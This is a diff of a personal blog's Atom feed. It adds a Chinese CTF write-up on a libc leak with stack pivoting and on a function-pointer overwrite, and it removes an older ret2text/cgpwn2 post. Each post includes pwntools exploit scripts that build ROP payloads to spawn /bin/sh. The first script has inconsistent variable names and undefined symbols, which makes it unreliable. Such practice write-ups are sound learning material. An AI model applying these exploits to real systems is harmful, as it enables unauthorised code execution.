@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cc-nianchu.github.io</id>
     <title>nianchu</title>
-    <updated>2021-08-03T14:40:51.557Z</updated>
+    <updated>2021-09-22T13:50:36.093Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://cc-nianchu.github.io"/>
     <link rel="self" href="https://cc-nianchu.github.io/atom.xml"/>
@@ -10,6 +10,185 @@
     <logo>https://cc-nianchu.github.io/images/avatar.png</logo>
     <icon>https://cc-nianchu.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, nianchu</rights>
+    <entry>
+        <title type="html"><![CDATA[泄漏libc+栈迁移]]></title>
+        <id>https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/</id>
+        <link href="https://cc-nianchu.github.io/post/xie-lou-libczhan-qian-yi/">
+        </link>
+        <updated>2021-09-21T10:42:04.000Z</updated>
+        <content type="html"><![CDATA[<p>先得到附件     先checksec一下，发现是64位程序且有NX保护<br>
+<img src="https://cc-nianchu.github.io/post-images/1632221270879.png" alt="" loading="lazy"><br>
+然后我们运行一下这个文件<br>
+<img src="https://cc-nianchu.github.io/post-images/1632221389732.png" alt="" loading="lazy"><br>
+发现只有一次简单的输入而且给了一个地址，我们打开ida64看main函数。<br>
+<img src="https://cc-nianchu.github.io/post-images/1632221481613.png" alt="" loading="lazy"><br>
+发现main函数中 printf（buf)的基址已经有read函数，溢出了0x10.这意味着我们想构造rop链应该不行，因为长度不够，我们得另想办法，而且开了NX保护无法执行shellcode<br>
+找sys函数且shift+F12无法找到sys函数已经/bin/sh函数<br>
+于是我想到泄漏libc，然后我发现了puts函数，利用思路是栈溢出后利用puts函数打印出任何函数的地址，然后返回main函数再次进行利用<br>
+利用 puts_plt 把 puts 函数的GOT表项打出来，然后回到main。<br>
+这样子我们就可以泄漏出libc了<br>
+libc_base=puts_addr -libc.symbols['put']<br>
+以及我们想要的sys_addr=libc_base+libc.symbols['system']<br>
+首先思路是这样的没错，但是我们很快就会发现0x10长度无法够我们泄漏libc，那我们得栈迁移，将栈迁移到buf前方。<br>
+<img src="https://cc-nianchu.github.io/post-images/1632317862822.png" alt="" loading="lazy"></p>
+<p>payload的构造：先填充8个字符，因为在64位系统的时候栈迁移会让rsp迁移到rbp+8的位置，这时候rsp会自动加8，所以我们要填充8个字节，pop_rdi会将pop放在rdi寄存器，然后利用put函数，参数放put_got，返回地址为main函数，然后填充&quot;a&quot;*(0xd0-len(payload)填充到p64(buf_addr)。最后的p64(leave)就是栈迁移的知识，leave相当于是mov rsp,rbp; pop rbp;，把rbp的值放到rsp，之后栈顶就是buf-8了，再pop rbp，就把buf-8给了rbp，所以执行完后<br>
+如图：<img src="https://cc-nianchu.github.io/post-images/1632317941072.png" alt="" loading="lazy"><br>
+然后就可以正常的执行我们构造的gadget片段了<br>
+栈结构如图<br>
+<img src="https://cc-nianchu.github.io/post-images/1632318017076.png" alt="" loading="lazy"><br>
+泄露出了libc我们就可以利用system函数了，找到/bin/sh字符串地址<br>
+puts_addr = u64(p.recv(6).ljust(8,'\x00'))<br>
+libc_base = puts_addr - libc.symbols['puts']<br>
+sys_addr = libc_base + libc.symbols['system']<br>
+sh_addr = libc_base + next(libc.search('/bin/sh'))<br>
+再次接收printf的地址<br>
+leak_addr=int(p.recv(14),16)<br>
+然后重新构造一个gadget片段执行system（/bin/sh)<br>
+payload = 'a'<em>8+p64(pop_rdi)+p64(sh_addr)+p64(ret)+p64(sys_addr)<br>
+payload += 'a'</em>(0xd0-len(payload))+p64(leak_addr)+p64(leave)</p>
+<p>exp如下:</p>
+<pre><code>from pwn import *
+#from LibcSearcher import *
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+r = process(&quot;./1&quot;)
+elf = ELF('./1')
+libc= elf.libc
+puts_got_addr = elf.got['puts']
+puts_plt_addr = elf.plt['puts']
+main = 0x00400577
+pop_rdi = 0x00400663
+leave = 0x0004005F8
+address = int(p.recv(14),16)
+addr = int(address,16)
+print(addr)
+#gdb.attach(r)
+
+payload =  'a'*8
+payload += p64(pop_rdi)
+payload += p64(puts_got_addr)
+payload += p64(puts_plt_addr)
+payload += p64(main)
+payload += b'A'*0xa8
+payload += p64(addr)
+payload += p64(leave)
+#gdb.attach(r)
+r.send(payload)
+#gdb.attach(r)
+
+puts_addr = u64(p.recv(6).ljust(8,'\x00'))
+libc_base = puts_addr - libc.symbols['puts']
+sys_addr = libc_base + libc.symbols['system']
+sh_addr = libc_base + next(libc.search('/bin/sh'))
+
+leak_addr=int(p.recv(14),16)
+
+payload =  'a'*8
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
+payload += p64(main)
+payload += b'A'*0xa8
+payload += p64(leak_addr)
+payload += p64(leave)
+
+r.send(payload)
+
+
+r.interactive()
+</code></pre>
+<p>第二题：<br>
+拿到附件checksec</p>
+<pre><code>[*] '/home/nianchu/Desktop/zhaoxinti/2'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>发现64位系统且开了nx保护，打开ida64，查看函数<br>
+发现一个后门函数</p>
+<pre><code>int success()
+{
+  puts(&amp;s);
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>会return 到system（&quot;/bin/sh&quot;)<br>
+所以我们只需要找到溢出点然后返回到后门函数就行<br>
+main函数：</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v5; // [rsp+Ch] [rbp-24h] BYREF
+  int v6; // [rsp+10h] [rbp-20h]
+  int v7; // [rsp+14h] [rbp-1Ch]
+  char v8[8]; // [rsp+18h] [rbp-18h] BYREF
+  void (*v9)(void); // [rsp+20h] [rbp-10h]
+  unsigned __int64 v10; // [rsp+28h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  init();
+  v7 = 0;
+  v5 = 0;
+  v6 = 1;
+  puts(&amp;byte_400988);
+  puts(a1);
+  __isoc99_scanf((__int64)&amp;unk_400A87, (__int64)&amp;v5);
+  while ( v6 )
+  {
+    if ( v5 == 1 )
+    {
+      puts(&amp;byte_400A90);
+      system(&quot;poweroff&quot;);
+      v6 = 0;
+    }
+    else if ( v5 == 2 )
+    {
+      puts(&amp;byte_400AC8);
+      v6 = 0;
+    }
+    else
+    {
+      puts(&amp;byte_400B18);
+      __isoc99_scanf((__int64)&amp;unk_400A87, (__int64)&amp;v5);
+    }
+  }
+  puts(&amp;byte_400B40);
+  puts(&amp;byte_400C08);
+  fflush(stdin);
+  puts(&amp;byte_400C4A);
+  __isoc99_scanf((__int64)&amp;unk_400C5D, (__int64)v8);
+  v9();
+  return __readfsqword(0x28u) ^ v10;
+}
+</code></pre>
+<p>main函数很长，但是我们发现第一次输入1就是关机，输入2会有一串字符串然后再会输入一次，并且发现v8【8】且下面有一个v9()并且v9是指针，点进去v8发现</p>
+<pre><code>0000000000000024 var_24          dd ?
+-0000000000000020 var_20          dd ?
+-000000000000001C var_1C          dd ?
+-0000000000000018 var_18          db 8 dup(?)
+-0000000000000010 var_10          dq ?
+-0000000000000008 var_8           dq ?
+</code></pre>
+<p>v8再 var_18但是v9在var_10，所以我们填充8个字符加返回地址变可以 cat flag了<br>
+exp：</p>
+<pre><code># -*- coding: UTF-8 –*-
+
+from pwn import *
+r=process('./2')
+r.recvuntil('2.绑定系统开启重回巅峰之路')
+
+r.sendline('2')
+payload=p64(0xdeafbeef)+p64(0x400759)
+
+r.recv()
+r.sendline(payload)
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[每日1+（认怂了）]]></title>
         <id>https://cc-nianchu.github.io/post/mei-ri-1ren-song-liao/</id>
@@ -1183,219 +1362,6 @@ shellcode = asm(shellcraft.sh())
 buf2_addr = 0x804a080
 
 qsendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
-q.interactive()
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[构造基本rop]]></title>
-        <id>https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/</id>
-        <link href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
-        </link>
-        <updated>2021-07-14T00:55:46.000Z</updated>
-        <summary type="html"><![CDATA[<pre><code> 能构造rop的题目得满足一下条件：
-        程序存在溢出，并且可以控制返回地址。
-        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
-</code></pre>
-<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳</p>
-<h2 id="ret2text">ret2text</h2>
-<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
-做题目前首先得查看一下程序的保护机制</p>
-]]></summary>
-        <content type="html"><![CDATA[<pre><code> 能构造rop的题目得满足一下条件：
-        程序存在溢出，并且可以控制返回地址。
-        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
-</code></pre>
-<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳</p>
-<h2 id="ret2text">ret2text</h2>
-<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
-做题目前首先得查看一下程序的保护机制</p>
-<!-- more -->
-<p>Arch:     i386-32-little<br>
-RELRO:    Partial RELRO<br>
-Stack:    No canary found<br>
-NX:       NX enabled<br>
-PIE:      No PIE (0x8048000)</p>
-<!-- more -->
-<p>很明显可以看出这是32位程序，只开了NX保护<br>
-我们用ida32打开文件   按F5进入main函数</p>
-<!-- more -->
-<p>int __cdecl main(int argc, const char **argv, const char **envp)<br>
-{<br>
-char s[100]; // [esp+1Ch] [ebp-64h] BYREF</p>
-<p>setvbuf(stdout, 0, 2, 0);<br>
-setvbuf(_bss_start, 0, 1, 0);<br>
-puts(&quot;There is something amazing here, do you know anything?&quot;);<br>
-gets(s);<br>
-printf(&quot;Maybe I will tell you next time !&quot;);<br>
-return 0;<br>
-}</p>
-<!-- more -->
-<p>发现gets（）函数，gets是不限制输入内容，仅收到回车后结束 //gets，直接读取一行，忽略'\x00'<br>
-再查看其他函数发现/bin/sh          //经典后面函数直接进入系统</p>
-<!-- more -->
-<p>void secure()<br>
-{<br>
-unsigned int v0; // eax<br>
-int input; // [esp+18h] [ebp-10h] BYREF<br>
-int secretcode; // [esp+1Ch] [ebp-Ch]</p>
-<p>v0 = time(0);<br>
-srand(v0);<br>
-secretcode = rand();<br>
-__isoc99_scanf((int)&amp;unk_8048760, (int)&amp;input);<br>
-if ( input == secretcode )<br>
-system(&quot;/bin/sh&quot;);<br>
-}</p>
-<!-- more -->
-<p>再ida找到/bin/sh的地址</p>
-<!-- more -->
-<p>.text:080485FD                 push    ebp<br>
-.text:080485FE                 mov     ebp, esp<br>
-.text:08048600                 sub     esp, 28h<br>
-.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>
-.text:0804860A                 call    _time<br>
-.text:0804860F                 mov     [esp], eax      ; seed<br>
-.text:08048612                 call    _srand<br>
-.text:08048617                 call    _rand<br>
-.text:0804861C                 mov     [ebp+secretcode], eax<br>
-.text:0804861F                 lea     eax, [ebp+input]<br>
-.text:08048622                 mov     [esp+4], eax<br>
-.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>
-.text:0804862D                 call    ___isoc99_scanf<br>
-.text:08048632                 mov     eax, [ebp+input]<br>
-.text:08048635                 cmp     eax, [ebp+secretcode]<br>
-.text:08048638                 jnz     short locret_8048646<br>
-.text:0804863A                mov  dword ptr [esp], offset command ; &quot;/ bin/sh<br>
-.text:08048641                 call    _system</p>
-<!-- more -->
-<p>发现/bin/sh地址在0x0804863A,这是bin_str=0x0804863A，那么如果我们直接控制程序返回至 0x0804863A<br>
-下面就是我们如何构造 payload 了，从gets开始寻找</p>
-<!-- more -->
-<p>.text:080486A7                 lea     eax, [esp+1Ch]<br>
-.text:080486AB                 mov     [esp], eax      ; s<br>
-.text:080486AE                 call    _gets</p>
-<!-- more -->
-<p>利用gdb来打断点</p>
-<!-- more -->
-<p>pwndbg&gt; b *0x080486AE<br>
-Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.<br>
-pwndbg&gt; r<br>
-Starting program: /home/nianchu/Desktop/新手训练/ret2text<br>
-There is something amazing here, do you know anything?</p>
-<p>Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>
-24	ret2text.c: 没有那个文件或目录.<br>
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>
-─────────────────────────────────[ REGISTERS ]──────────────────────────────────<br>
-EAX  0xffffcefc —▸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x26f34<br>
-EBX  0x0<br>
-ECX  0xf7fb7dc7 (<em>IO_2_1_stdout</em>+71) ◂— 0xfb88900a<br>
-EDX  0xf7fb8890 (_IO_stdfile_1_lock) ◂— 0x0<br>
-EDI  0x0<br>
-ESI  0xf7fb7000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x1d7d8c<br>
-EBP  0xffffcf68 ◂— 0x0<br>
-ESP  0xffffcee0 —▸ 0xffffcefc —▸ 0xf7ffd000 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x26f34<br>
-EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8</p>
-<!-- more -->
-<p>从ESP可以发现在esp为0xffffcee0，ebp为0xffffcf68,s为0xffffcefc<br>
-·········s 相对于 ebp 的偏移为 0x6c<br>
-·········s 相对于返回地址的偏移为 0x6c+4<br>
-最后payload构造如下：</p>
-<!-- more -->
-<p>from pwn import*</p>
-<p>q=process('./ret2text')<br>
-bin_str=0x0804863A<br>
-payload='a'*(0x6c+4)+p32(bin_str)<br>
-q.sendline(payload)<br>
-q.interactive()</p>
-<!-- more -->
-<h2 id="cgpwn2">cgpwn2</h2>
-<p>这道题在攻防世界的新手题，拿到题目先checksec一下</p>
-<pre><code>Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-</code></pre>
-<p>然后打开ida32位f5获得伪代码</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  setbuf(stdin, 0);
-  setbuf(stdout, 0);
-  setbuf(stderr, 0);
-  hello();
-  puts(&quot;thank you&quot;);
-  return 0;
-}
-</code></pre>
-<p>可以发现main函数里面啥都没有，只有3个缓冲区和有个hello()函数，继续打开看看</p>
-<pre><code>char *hello()
-{
-  __int16 *v0; // eax
-  int v1; // ebx
-  unsigned int v2; // ecx
-  __int16 *v3; // eax
-  __int16 s; // [esp+12h] [ebp-26h] BYREF
-  int v6; // [esp+14h] [ebp-24h] BYREF
-
-  v0 = &amp;s;
-  v1 = 30;
-  if ( ((unsigned __int8)&amp;s &amp; 2) != 0 )
-  {
-    s = 0;
-    v0 = (__int16 *)&amp;v6;
-    v1 = 28;
-  }
-  v2 = 0;
-  do
-  {
-    *(_DWORD *)&amp;v0[v2 / 2] = 0;
-    v2 += 4;
-  }
-  while ( v2 &lt; (v1 &amp; 0xFFFFFFFC) );
-  v3 = &amp;v0[v2 / 2];
-  if ( (v1 &amp; 2) != 0 )
-    *v3++ = 0;
-  if ( (v1 &amp; 1) != 0 )
-    *(_BYTE *)v3 = 0;
-  puts(&quot;please tell me your name&quot;);
-  fgets(name, 50, stdin);
-  puts(&quot;hello,you can leave some message here:&quot;);
-  return gets((char *)&amp;s);
-}
-</code></pre>
-<p>前面看不懂没什么关系，主要看到后面有</p>
-<pre><code>puts(&quot;please tell me your name&quot;);
-  fgets(name, 50, stdin);
-  puts(&quot;hello,you can leave some message here:&quot;);
-  return gets((char *)&amp;s);
-</code></pre>
-<p>从gets()函数可以name那里可以看出这里可以栈溢出然后写入我们想要的东西<br>
-在函数列表看到一个pwn函数，打开得</p>
-<pre><code>int pwn()
-{
-  return system(&quot;echo hehehe&quot;);
-}
-</code></pre>
-<p>main函数和hello函数里面都没有他，而且这个函数是打印hehehe但是可以获得system函数，<br>
-因此我们先通过栈溢出将引用pwn函数再将里面的echo hehehe改成/bin/sh<br>
-思路清晰了之后我们可以通过ida找到call system函数的地址，再找name的地址<br>
-再找s的偏移量<br>
-先通过shift+f4找到pwn函数地址，双击pwn函数<br>
-<img src="https://cc-nianchu.github.io/post-images/1626536255632.png" alt="" loading="lazy"><br>
-<img src="https://cc-nianchu.github.io/post-images/1626536266388.png" alt="" loading="lazy"><br>
-在这里可以发现sys_addr=0x0804855A<br>
-在hello函数里可以发现 name_addr=0x0804A080,s的偏移量为24<br>
-我们要运行system(/bin/sh)因此我们要输入/bin/sh到sys_addr上<br>
-exp:</p>
-<pre><code>from pwn import *
-q = remote('ip',端口)
-sys_addr = 0x804855A
-name_addr = 0x804A080
-payload = 'a' * 0x26 + 'bbbb' + p32(sys_addr) + p32(name_addr)
-q = r.recvuntil('please tell me your name')
-q.sendline('/bin/sh')
-q = r.recvuntil('hello,you can leave some message here:')
-q.sendline(payload)
 q.interactive()
 </code></pre>
 ]]></content>
